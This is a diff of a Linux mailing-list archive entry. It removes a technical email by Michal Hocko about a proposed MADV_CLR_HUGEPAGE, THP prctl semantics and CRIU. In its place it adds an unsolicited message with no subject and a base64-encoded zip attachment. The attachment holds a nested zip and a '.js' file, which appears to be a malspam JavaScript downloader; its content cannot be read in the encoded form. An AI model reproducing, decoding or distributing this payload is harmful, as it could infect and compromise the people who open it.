@@ -1,61 +1,70 @@
-From: Michal Hocko <mhocko-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org>
-Subject: Re: [PATCH] mm: introduce MADV_CLR_HUGEPAGE
-Date: Wed, 31 May 2017 16:32:17 +0200
-Message-ID: <20170531143216.GR27783@dhcp22.suse.cz>
-References: <20170524142735.GF3063@rapoport-lnx>
- <20170530074408.GA7969@dhcp22.suse.cz>
- <20170530101921.GA25738@rapoport-lnx>
- <20170530103930.GB7969@dhcp22.suse.cz>
- <20170530140456.GA8412@redhat.com>
- <20170530143941.GK7969@dhcp22.suse.cz>
- <20170530154326.GB8412@redhat.com>
- <20170531120822.GL27783@dhcp22.suse.cz>
- <8FA5E4C2-D289-4AF5-AA09-6C199E58F9A5@linux.vnet.ibm.com>
- <20170531141809.GB302@redhat.com>
+From: <tjcrewvolcoordinator-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
+Subject: (unknown)
+Date: Wed, 31 May 2017 14:53:56 -0000
+Message-ID: <149624243650.29697.12770163180219233898@saturn-internet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="76390.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-api-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
-Content-Disposition: inline
-In-Reply-To: <20170531141809.GB302-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
+Content-Disposition: attachment
+Subject: 
 Sender: linux-api-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: Andrea Arcangeli <aarcange-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-Cc: Mike Rapoprt <rppt-23VcF4HTsmIX0ybBhKVfKdBPR1lH4CV8@public.gmane.org>, Vlastimil Babka <vbabka-AlSwsSmVLrQ@public.gmane.org>, "Kirill A. Shutemov" <kirill-oKw7cIdHH8eLwutG50LtGA@public.gmane.org>, Andrew Morton <akpm-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>, Arnd Bergmann <arnd-r2nGTMty4D4@public.gmane.org>, "Kirill A. Shutemov" <kirill.shutemov-VuQAYsv1563Yd54FQh9/CA@public.gmane.org>, Pavel Emelyanov <xemul-5HdwGun5lf+gSpxsJD1C4w@public.gmane.org>, linux-mm <linux-mm-Bw31MaZKKs3YtjvyW6yDsg@public.gmane.org>, lkml <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Linux API <linux-api-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+To: linux-api-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
 List-Id: linux-api@vger.kernel.org
 
-On Wed 31-05-17 16:18:09, Andrea Arcangeli wrote:
-> On Wed, May 31, 2017 at 03:39:22PM +0300, Mike Rapoport wrote:
-> > For the CRIU usecase, disabling THP for a while and re-enabling it
-> > back will do the trick, provided VMAs flags are not affected, like
-> > in the patch you've sent.  Moreover, we may even get away with
-> 
-> Are you going to check uname -r to know when the kABI changed in your
-> favor (so CRIU cannot ever work with enterprise backports unless you
-> expand the uname -r coverage), or how do you know the patch is
-> applied?
-
-I would assume such a patch would be backported to stable trees because
-to me it sounds like the current semantic is simply broken and needs
-fixing anyway but it shouldn't be much different from any other bugs.
-
-This is far from ideal from the "guarantee POV" of course.
-
-> Optimistically assuming people is going to run new CRIU code only on
-> new kernels looks very risky, it would leads to silent random memory
-> corruption, so I doubt you can get away without a uname -r check.
-> 
-> This is fairly simple change too, its main cons is that it adds a
-> branch to the page fault fast path, the old behavior of the prctl and
-> the new madvise were both zero cost.
-> 
-> Still if the prctl is preferred despite the added branch, to avoid
-> uname -r clashes, to me it sounds better to add a new prctl ID and
-> keep the old one too. The old one could be implemented the same way as
-> the new one if you want to save a few bytes of .text. But the old one
-> should probably do a printk_once to print a deprecation warning so the
-> old ID with weaker (zero runtime cost) semantics can be removed later.
-
-this would be an option as well although it adds to the mess...
-
--- 
-Michal Hocko
-SUSE Labs
+UEsDBAoAAgAAAMijv0poiKAozQsAAM0LAAAJABwAMTE2MzEuemlwVVQJAAN30y5Zd9MuWXV4CwAB
+BAAAAAAEAAAAAFBLAwQUAAIACACDmr9KYFxtmScLAAD2IgAACAAcADExNjMxLmpzVVQJAAMGwy5Z
+StEuWXV4CwABBAAAAAAEAAAAAO1a247cxhF9lgD9g8EXDXcIu3knsZkAgYG8BfOgx70AvEprSUtg
+PHbWEPTvqVN1muTMrqx1ICQwEgGj4bK7q+ty6tY94y/33fFuuv9ucvu9c24z7ae9PEbT5Ny034ev
+Xn569fLFYTj+cpBJNnjLwctXLz+/ejnOJOSVzNjsZXjvpghTJzeRxK/NQdY7J69k3Yvj4Tf5HwM6
+crcL/tEcA4y84Kzd5n7453d/J/VNMIHuNAVRIITBCZ50KzxhzEYXXvHiKtjebYN3V5x5s+HfnH+z
+CS9ILry5DMJz5iPw8LfDofltE0dJlEbB+GGaDkF4ld48Hjs09/30UQfDELKIel50zbF7txkOIeX9
+vNan18eJHr+BKWRoDxIT5p2ZQEYw/8U4HTaXl6HawMxh9tB5P+0C6EdIb/a25ArMyl433//8S/vz
+8bBJoiQMhYE9FHulW4mCzYZK4/0u6N69FpUvr467QLmwRTtqkBPI27nhQVbEDKLjNhBdJ1kZxUUW
+FUlU5/IUR3FWR0keJUnCxyQq6yjNothFcS6z61IGszCiJDtSvHr9UTC3fb8Nfri+fvMp+/zD2zAS
+iaG73XVwHUQUeecuoSxwPr+JKLCM8d1fSP77D8P92+M7/3q79VO32/DT3bjhX3/dUQucH35aKH4m
+F9sdwCkWFtj+tA3Cy8/BVv6ExTfhV56CDYmEwLVHQmiqbg9D814fAccTjBIEdzs3j59Clvg5xRt3
+XQFtgvDTma/z7WMTw9ucerQD7OTJwgL/vlSSDj6736napmlzF+rrh52PPJwQkVx4SaYfoIEsCj40
+vw7B8zxz5v5ETG68V7vtT6SFst0jafXto0im1H0kE57xpP+mnSIxFiRezpzo5CtOvdlwplqVjJxF
+ouAjBJMwlDwzDM3Mr4UFbRlZ21S16twuuLit44vbXj65u7hNO3nOL25H+S6Li9tW3rXyd91e3CaN
+zJF32WDjraypYvvu5X0u32kiY9nF7VDKetCR94PQqGRNkl7cusHojPLdyLyqM9od1o+2fyfjrXwX
+QqtpjFYltFKZn8unkPmDzB3AVyUfmdNVxm/SGv8YS2v5Tsl/Qv5z++6FfiPza6FXCy+9jOey1sle
+A+QD/1jbmgyV0C/knRNZMvnuZE7dC43e5tQyJ3ZcDx3Wpo8KvMl3A3lkrpO5aWz8NZXJ34osPejK
+3ESeK/mM8lzU3B8yZba+kHWZjHe16aXDXqXZL5PnVHiuepO5HI32WBtNyP3c/QeRp+zM/mPM/SGj
+0CpS4wk0oPeK/OSiw7ik/mPjf3RGC/pLBsMP+IKOsb7vzd6V0HfQ0Wh4hP1hvyY3OWt5TmXPHHYR
+WmOK9cFW0CwIrlKzALgBFymoOrNcmRCFvVEGCgvZsQQHtWkK1sROsFTWmxbwDlJiLqwALdepIQxI
+SeAdQEBqXlBzDsaARKByqKjFxLSgUmTmaZBU93eGToxBC7nQTGXvrjfLlS2tiPWloRCWhhZhmaZe
+ocDZGCzdZabFJDEewUs9LlZQ6+SLFcEDvFhRJHT6dOWFnVkSVkwb8p9R/mKRX/Xfkf/EvBxog4yI
+ArU7jQIqP/RKDwVyXW48w0Nh5cKj0KOoMBvN+ycWHYAB7IEoAhvB/hgvm8ULdH95l6WUvzBvBe9Y
+r/ILP0lmEQkyw+tgS0Q1j2LsrShMzIuAoYp6jIG5nh4a2/oG+BpNpwV4rMyTh94jGHFOtTgaCoFz
+IEWlaI1KS78FFXCRFYYGcNa0htiKMQExGjt1pXGYVIzZtWk2qW0PSAIraSyvLZ7CHyEFNAUUAbmF
+R3FsKAN6M/oiYjH4VwQNhuIM8bew/aEdoGAciaLBPBRWxPoWlhzoBQlR3HL/kbHsa1bsV+tLW49Y
+iFgEmRFL2sp0VTPPqaVTQzDGqvzUi/9zKPgz298j+P8o+F9GwZ/Z/h7BX0MBNO5RAE1rXZJQC7HV
+pT4jVwkrktJqzrI0KZChUBdDi94KWtc4ZvSK9WNrtSPqyJgWwlxkcWRnIADPQIuvy7CHr6trfoCC
+eOD+rMvBp6KItdp/tSJprKLAHFgR+6PaQE0571/bnJ4VmlZUqemgbVgRDMY/eJzlH62+jZnRe9aS
+8AitK1Or4YFClxi613Up+IcXqP2pa9TBQCGQDk+CjSAb3gHtQDe8W/GTmfw+CoysRFX/pe0zVzTs
+DyAXKhH1wtbkxXvM6el5Xv6+sd4lmetg+KLXonYH3hIJ66LepFAqmcUioBr1F9CP9VlmkjX0gp7V
+t6IIUjCeAbUaMwZDJjQIX0RdrXVlSxQV1GJjyAU/qMvwrN1BbHV13LE7qJZYhjjWj4Yyxw7Pdyca
+i7qlu1ArYo9qFSPrJRbF7IgqdnUlO0DwgDnlU91lZgjtGeM1lvW2JqvNC5T/zNAXs8tC39AWFovh
+TdpXNNbhoFPDeo1l5RKLXM26tjAva+iFKn9hKFb+G4uFHi1PeQFsqt21j4cj63p6EaKQopDdvaIw
+sd4J81T/tdm/AY5y4z8tV31Ns5IfcpeGAdBBFGsZHZFL+mLlhU9GUY9gjaXZEkuhRc2m7KmBMERx
+WARaXvuidmexcVHWzHQppZDvjt0ctAB6AzNSe5bRv/kZhTMLIhb4/rfumNEGQyO0qBm6sf4eciEH
+aCzsTJPgce5u6sWLBp7XwDLQn2M8ms9oKkM4kJRVFst7novoGU+3xC2fi0DHRwFUH75H1zOixiyK
+9ahewIeigGcuiCJAEqIO0FOxKkAuBIqQi7TbYm7x50+IJAUiU8zufDQv0IoI+xdLLuxWZzQV969o
+N60IStq+of6TpaLx3TnOWDSXscLzUSRjjtToxHHQVn7bU/shL6j+G49gi8i/IwVPdrSuqZaIjswA
+xGtGak0KX5FoXZjY2Egt+roMqEDsArfwU3iB1jUtY3HG9cNpLNeTlj+iBZ6xzCdlrDWBpNJZRaOx
+VOik41kuqImifOnxNRekhrysWbwI/GldOzJeDIxFoyEQsXRtRT1p7LjenzQyChSMArq+M4SCB61o
+MsuysB5iu0aRflXXPhGFwEtN2TSK9MtJGaIFqgePwvmka2Rd7liR5TyjSik/KwqgqWW81oposFzg
+cxnWKg/x4zMmfxYyR7GOGCFdn0s0kras1gqrIBb9zZ3cv6FFPSljd4Ds5bXoMzq4BBdzRfJHYjnf
+NTFPqmpDEVD81bqctWfjK4LY4pCeN8ZLRYB68Lyi8funPEkCbV+Xw3JaF/IcdOT5LDJi2z+vrgWK
+UyJDowC7SD2vrs0LNRbnzCWdzYUNgDzEXuW/Nu9VK3aUP2VF1FokGnxfUDCXODufVi/OLGP7LupR
+FFqddNbkzcfytFhOSlPfheWr9c1q/RdQWJE/jSLsoPW8efhyd9mPSxTsK1tfjB7BWpeU7K4qkxSZ
+Wn2EGU2liK2OK9mZaXXeszpPGStLnrxXFns1lvsqvbO61VVfru59RitYF3kv6lexEFkEcRXxBzUW
+xgdqy986+NN09QL2yZDPZyR4LPbXU3OfkdndwAsTX69R+9qdnVcUq+5MuztvxZX+0GNXPOPwtz7a
+V9Byxaq7O+9OIZN1t3pNzDsrXkU9uoe0K+vJrvHXF3ROLwfPL+js7aPrSNy17fe8hHzYXQfu4TrY
+8vXV6+P05ni4u3/7+mZzesfo933WrdvM0cmtG+977drzTAL8XuCJH0887AKww19P2LSn7hwn/c3E
+HX4tob878Les/lr8TbB92AZvr66D8Ro/k7gO3jWHH6/1yhnTbzakMgvNlSq6MRwFh+njj8HJjWQw
+9UMQXsU3z9UL5fw2P4rwv4WY7zPDy38BUEsBAh4DFAACAAgAg5q/SmBcbZknCwAA9iIAAAgAGAAA
+AAAAAQAAAKSBAAAAADExNjMxLmpzVVQFAAMGwy5ZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEA
+TgAAAGkLAAAAAFBLAQIeAwoAAgAAAMijv0poiKAozQsAAM0LAAAJABgAAAAAAAAAAACkgQAAAAAx
+MTYzMS56aXBVVAUAA3fTLll1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAEAwAAAAA
